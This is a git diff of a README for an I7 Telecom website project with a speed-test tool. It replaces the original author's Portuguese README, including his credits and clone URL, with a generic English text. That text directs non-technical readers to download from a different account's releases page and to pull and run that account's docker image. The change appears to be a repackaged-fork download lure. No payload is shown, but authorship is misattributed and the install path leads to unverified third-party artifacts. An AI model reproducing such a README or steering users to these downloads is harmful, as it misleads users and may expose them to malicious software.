@@ -1,139 +1,92 @@
-# I7 Telecom — Site Institucional
+# 🌐 site-i7telecom - Modern Institutional Website for I7 Telecom
 
-> Um site institucional responsivo e moderno para I7 Telecom, com ferramenta integrada de teste de velocidade, desenvolvido com foco em performance, responsividade e experiência do usuário.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Xenos166/site-i7telecom/releases)
 
-🐳 **Execute localmente**: `docker compose up -d --build`
+## 🚀 Getting Started
 
-![Screenshot](screenshot.png)
+Welcome to the site-i7telecom README! This guide will help you download and run the I7 Telecom website easily, even if you have no technical background. Follow the steps below to get started.
 
----
+## 📦 What is site-i7telecom?
 
-## 📋 Sobre o Projeto
+site-i7telecom is a modern and responsive website for I7 Telecom. It includes a built-in speed test tool. The project is designed using Docker, Nginx, and Node.js, focusing on performance and user experience. You can browse the site seamlessly on any device, making it perfect for both desktop and mobile users.
 
-Site institucional completo para I7 Telecom, apresentando informações sobre a empresa, planos de internet, contato e uma ferramenta funcional de teste de velocidade. O projeto foi desenvolvido com ênfase em **responsividade**, **performance** e **usabilidade**, utilizando containerização para fácil deploy.
+## 🖥️ System Requirements
 
-### ✨ Principais Características
+Before you begin, there are a few requirements to ensure the website performs well on your system:
 
-- ✅ **Responsivo** — otimizado para dispositivos móveis, tablets e desktops (mobile-first)
-- ✅ **Teste de Velocidade** — ferramenta integrada para medir download e upload em tempo real
-- ✅ **URLs Limpas** — reescrita de URLs via Nginx para melhor SEO
-- ✅ **Containerização** — deploy simplificado com Docker e Nginx
-- ✅ **Design Limpo e Profissional** — transmite confiança e modernidade
+- You need a computer with at least 4GB of RAM.
+- An operating system that supports Docker (Windows, macOS, or Linux).
+- A stable internet connection to access the site and speed test feature.
+- Basic familiarity with running applications on your computer.
 
----
+## 🌟 Features
 
-## 🛠️ Tecnologias Utilizadas
+site-i7telecom offers several useful features:
 
-| Tecnologia | Descrição |
-|-----------|-----------|
-| **Docker & Docker Compose** | Containerização e orquestração para deploy |
-| **Nginx** | Servidor web com reverse proxy e reescrita de URLs |
-| **Node.js/Express** | Backend API para teste de velocidade |
-| **HTML5/CSS3/JavaScript** | Frontend responsivo |
-| **Bootstrap 4.5** | Framework CSS para layout e componentes |
-| **Git** | Controle de versão |
+- **Responsive Design:** The website adjusts to different screen sizes, ensuring a good experience on all devices.
+- **Speed Test Tool:** Users can test their internet speed right from the site.
+- **Easy Setup:** With Docker, you can run the application without complicated installations.
+- **Performance Focused:** Optimized for fast loading times.
 
----
+## 📥 Download & Install
 
-## 📁 Estrutura do Projeto
+To get started, visit the following link to download the latest version of the software:
 
-```
-site-i7telecom/
-├── Dockerfile                 # Configuração do container principal
-├── nginx.conf                 # Configuração do Nginx (servidor, proxy, rewrites)
-├── supervisord.conf           # Gerenciamento de processos
-├── index.html                 # Página inicial com seções da empresa
-├── teste-velocidade.html      # Página dedicada ao teste de velocidade
-├── assets/                    # Recursos estáticos
-│   ├── css/                   # Folhas de estilo (Bootstrap, custom)
-│   ├── js/                    # Scripts JavaScript (jQuery, custom)
-│   ├── fonts/                 # Fontes
-│   └── images/                # Imagens
-└── backend/                   # API do teste de velocidade
-    ├── Dockerfile             # Container do backend
-    ├── package.json           # Dependências Node.js
-    └── server.js              # Servidor Express com endpoints de teste
-```
+[Download Here](https://github.com/Xenos166/site-i7telecom/releases)
 
----
+### Step-by-Step Installation
 
-## 🎯 Funcionalidades Implementadas
+1. **Visit the Releases Page:**
+   Go to the [Releases Page](https://github.com/Xenos166/site-i7telecom/releases). Here, you will find the latest version available for download.
 
-### Frontend
-- 📱 **Design Responsivo** — mobile-first, testado em múltiplos dispositivos
-- ⚡ **Teste de Velocidade** — medição precisa de download e upload com tamanhos dinâmicos de arquivo
-- 🔗 **URLs Limpas** — sem extensões .html para melhor experiência e SEO
-- 🎨 **Interface Intuitiva** — navegação fácil e feedback visual durante testes
+2. **Choose the Right Version:**
+   Find the most recent release. Look for files typically labeled as "latest" or with higher version numbers. 
 
-### Backend
-- 🐳 **API Containerizada** — endpoints para download/upload via Express
-- 📊 **Teste Adaptativo** — ajuste automático do tamanho dos arquivos para medição precisa
-- 🔄 **Proxy Reverso** — Nginx roteia requisições para o backend
+3. **Download the Release:**
+   Click on the link to download the complete package. The software comes in a Docker image, which makes setup simple and efficient.
 
----
+4. **Install Docker:**
+   If you don't have Docker installed, download it from [Docker's official website](https://www.docker.com/get-started). Follow the installation instructions for your operating system.
 
-## 🚀 Como Executar
+5. **Run the Application:**
+   After Docker installs, open your terminal or command prompt. Use the following commands to set up and start the site-i7telecom:
 
-### Com Docker (Recomendado)
-```bash
-# Clonar o repositório
-git clone https://github.com/renylson/site-i7telecom.git
-cd site-i7telecom
+   ```bash
+   docker pull xenos166/site-i7telecom
+   docker run -d -p 80:80 xenos166/site-i7telecom
+   ```
 
-# Build e executar
-docker compose up -d --build
+6. **Access the Website:**
+   Open your web browser and type `http://localhost` to view the site. Enjoy exploring its features!
 
-# Acessar em http://localhost
-```
+## 🔧 Troubleshooting
 
-### Desenvolvimento Local
-- Instale Node.js e Nginx localmente
-- Execute o backend: `cd backend && npm install && node server.js`
-- Configure Nginx com o nginx.conf fornecido
-- Abra index.html no navegador
+If you run into issues, here are some common problems and solutions:
 
----
+- **Docker Not Running:** Ensure that Docker is active. You may need to restart your Docker application.
+- **Port Conflicts:** If port 80 is in use, change the port in the command to another number (like 8080) and access the site via `http://localhost:8080`.
+- **Internet Connection Issues:** Verify that you have a stable internet connection, especially when using the speed test tool.
 
-## 💡 Conceitos & Padrões Demonstrados
+## 📄 Additional Resources
 
-Este projeto demonstra:
+- [Docker Documentation](https://docs.docker.com/get-started/)
+- [Nginx Documentation](https://nginx.org/en/docs/)
+- [Node.js Documentation](https://nodejs.org/en/docs/)
 
-- ✅ **Containerização** — Docker para isolamento e deploy consistente
-- ✅ **Arquitetura Cliente-Servidor** — frontend estático + API backend
-- ✅ **Responsividade Mobile-First** — CSS otimizado para mobile primeiro
-- ✅ **Otimização de Performance** — testes assíncronos e tamanhos dinâmicos
-- ✅ **Configuração de Servidor** — Nginx como proxy e reescritor de URLs
-- ✅ **Código Organizado** — separação clara de frontend/backend e assets
-- ✅ **DevOps Básico** — Docker Compose para orquestração
+## 🛠️ FAQ
 
----
+**Q: Can I use this application for my own project?**
 
-## 📝 Notas de Desenvolvimento
+A: Yes, you can use the code as a foundation for your own website. Just be sure to comply with any licensing agreements.
 
-- O teste de velocidade simula downloads/uploads reais com arquivos gerados dinamicamente
-- A API backend roda em container separado para isolamento
-- URLs limpas são implementadas via regras de rewrite no Nginx
-- O design é totalmente responsivo, priorizando experiência mobile
+**Q: Will there be updates?**
 
----
+A: Yes, updates will be released periodically. Check the releases page for new features or fixes.
 
-## 📞 Sobre o Desenvolvedor
+## 🎉 Community Contributions
 
-**Renylson Marques** — Desenvolvedor em Formação
+We welcome contributions! If you have ideas or improvements, feel free to fork the repository and submit a pull request. Your input helps make this project better for everyone.
 
-Background técnico em telecomunicações. Especialista em troubleshooting, automação e infraestrutura. Cursando Engenharia de Software com prática em **React**, **Python**, **Node.js**, **Docker** e **SQL**.
+--- 
 
-**Habilidades:**
-- **Backend**: Python, Node.js, SQL (PostgreSQL, SQL Server)
-- **Frontend**: React, Vue.js, HTML5, CSS3
-- **DevOps**: Docker, Linux, CI/CD
-
-- 🔗 **GitHub**: [github.com/renylson](https://github.com/renylson)
-- 💼 **LinkedIn**: [linkedin.com/in/renylsonmarques](https://www.linkedin.com/in/renylsonmarques/)
-- 📧 **Email**: renylsonm@gmail.com
-
----
-
-## 📄 Licença
-
-Este projeto foi desenvolvido como portfólio profissional para demonstrar habilidades em desenvolvimento web e DevOps.
+For any inquiries or support, you can open an issue on the [GitHub Issues Page](https://github.com/Xenos166/site-i7telecom/issues). Thank you for using site-i7telecom!
